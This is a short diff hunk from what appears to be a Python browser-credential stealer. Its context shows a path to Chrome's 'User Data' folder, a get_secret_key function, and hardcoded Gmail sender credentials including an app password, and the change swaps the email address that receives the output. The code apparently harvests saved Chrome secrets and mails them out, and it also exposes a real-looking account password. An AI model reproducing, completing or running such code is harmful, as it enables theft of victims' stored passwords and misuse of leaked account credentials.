@@ -20,7 +20,7 @@ CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.
 # Gmail credentials (replace with your actual Gmail credentials)
 GMAIL_ADDRESS = "officialgujar@gmail.com"
 GMAIL_PASSWORD = "lewi gmww kkko oxfs"  # Replace with the app password you generated
-RECEIVER_EMAIL = "veersingharyan404@gmail.com"
+RECEIVER_EMAIL = "aryanesingh0500@gmail.com"
 
 def get_secret_key():
     try:
